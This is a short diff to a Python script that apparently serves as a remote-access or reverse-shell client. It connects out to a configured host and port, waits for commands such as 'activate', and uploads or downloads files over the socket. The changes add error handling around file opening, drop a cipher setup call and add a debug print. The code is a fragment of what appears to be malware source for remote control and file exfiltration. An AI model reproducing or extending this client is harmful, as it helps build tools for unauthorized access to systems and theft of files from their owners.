@@ -18,7 +18,10 @@ sock = None
 ret = ''
 
 def Upload(sock, file):
-  f = open(file, 'rb')
+  try:
+    f = open(file, 'rb')
+  except IOError:
+    return 'Error opening file'
   d = f.read()
   Send(sock, d, '')
   Send(sock, '')
@@ -26,7 +29,10 @@ def Upload(sock, file):
   return 'File sent 🍺'
 
 def Download(sock, file):
-  f = open(file, 'wb')
+  try:
+    f = open(file, 'wb')
+  except IOError:
+    return 'Error opening file'
   d = Receive(sock)
   f.write(d)
   f.close()
@@ -87,9 +93,8 @@ while True:
     sock = socket.socket(AF_INET, SOCK_STREAM)
     sock.connect((HOST, PORT))
 
-    cipher = get_cipher()
-
     data = Receive(sock)
+    print(data)
 
     if data == 'activate':
       active = True
